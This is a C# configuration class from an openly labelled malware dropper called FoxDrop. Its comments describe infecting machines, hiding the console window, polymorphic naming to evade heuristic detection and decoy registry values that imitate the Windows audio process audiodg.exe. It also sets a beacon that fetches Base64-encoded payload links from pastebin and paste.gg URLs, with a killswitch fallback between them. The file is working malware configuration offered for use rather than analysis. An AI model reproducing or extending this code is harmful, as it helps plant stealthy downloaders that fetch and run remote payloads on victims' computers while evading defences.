using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace FoxDrop
{
    internal class Variables
    {
        public static void variablesTroubleshooting()
        {
            Console.WriteLine("[╒═■] Build Information: ");
            Console.WriteLine("[├] Assembly Info: " + Assembly.GetExecutingAssembly().FullName);
            Console.WriteLine("[├] Execution Path: " + Assembly.GetExecutingAssembly().Location);
            Console.WriteLine("[└] Polymorphic Seed: " + Hashing.CalculateFileMD5(Assembly.GetExecutingAssembly().Location));

            Console.WriteLine("\n[*] Performing Checks... ");
            if(!IS_POLYMORPHISM_ENABLED)
                Console.WriteLine("· Polymorphism Disabled, Checking static name ... " + ((STATIC_NAME.Length >= 8) ? "OK." : "FAILED.\n└─ REASON: Static name needs to be at least 8 characters long."));

            Console.WriteLine("· Checking Delay ... " + ((BEACON_DELAY_MS > 5000) ? "OK." : "WARNING.\n└─ REASON: Delay may be too small. It is recommended to have it above 5 seconds."));
            Console.WriteLine("\nPress ENTER to exit.");
            Console.ReadLine();
        }
        public static void debugLog(string message)
        { if (DEBUG_VIEW) { Console.WriteLine(message); } }

        // ##¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯## //
        // ###      Developer Features      ### //
        // ##________________________________## //

        // Run the program with this mode ON to check if everything is ready to start infecting (if enabled, it won't infect you)
        public static bool TROUBLESHOOTING_CHECKS_ENABLED = false; // IMPORTANT: Disable it to start infecting.

        // Run the program with this mode ON to Console-Log all the malware operations on the PC (You will still be infected)
        public static bool DEBUG_VIEW = false; // If enabled, the program will not be invisible and the terminal will appear.

        // ##¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯## //
        // ###     Malware Logic Values     ### //
        // ##________________________________## //

        // State whether or not the malware has polymorphic features to avoid heuristic detections.
        public static bool IS_POLYMORPHISM_ENABLED = true; // Turned on by default for obvious reasons.

        // Used if polymorphism is turned off, used to name registry keys. It needs to be at least 8 characters.
        public static string STATIC_NAME = "b1ec7d10"; // Incognito name, could be random or "SysAudioApp" type names.

        // Delay for every beacon request (Larger = Slower = Less Obvious in Network Analysis)
        public static int BEACON_DELAY_MS = 300000; // Default: 15000 (15s)

        // The URL including the payload(s) download link, delimited by new lines and *POSSIBLY* Base64 encoded.
        public static string BEACON_DOWNLOAD_CONTAINER_URL = "https://pastebin.com/raw/b4SYNyAT";

        // If the following string is not found on the first URL, the malware will use the fallback one instead.
        public static string BEACON_FALLBACK_KILLSWITCH_STRING = "a0ec32bd"; // Make sure to sync the URLs (1st and fallback)

        public static string BEACON_DOWNLOAD_CONTAINER_URL_FALLBACK = "https://paste.gg/p/test12d/a74c69eca9134181b7e4b6c7349a0ac5/files/254c551437794fdfbb08de2934d5754w/raw";

        public static bool ARE_PAYLOAD_LINKS_BASE64 = true; // Determine if each payload link is individually encoded in Base64.

        // Very useful miscellaneous variable to check if malware was executed on system before.
        public static bool IS_FIRST_EXECUTION_ON_SYSTEM = true; // Assumes its 1st execution by default.


        // ##¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯## //
        // ### Execution Policies and Data. ### //
        // ##________________________________## //

        // Generate a build-dependant polymorphic or static key name.
        public static string registryFolderName = IS_POLYMORPHISM_ENABLED ? Hashing.CalculateFileMD5(Assembly.GetExecutingAssembly().Location) : STATIC_NAME;

        // # Beacon key name, used to manage downloads.
        public static string beaconKeyName = registryFolderName.Substring(0, Math.Min(3, registryFolderName.Length)).ToUpper();

        // # Decoy key #1 value data
        public static string decoyKeyName1 = "ShortcutName";
        public static string decoyKeyValue1 = "Windows Audio Device Graph Isolation";

        // # Decoy key #2 value data
        public static string decoyKeyName2 = "Path";
        public static string decoyKeyValue2 = "C:\\Windows\\System32\\audiodg.exe";
    }
}
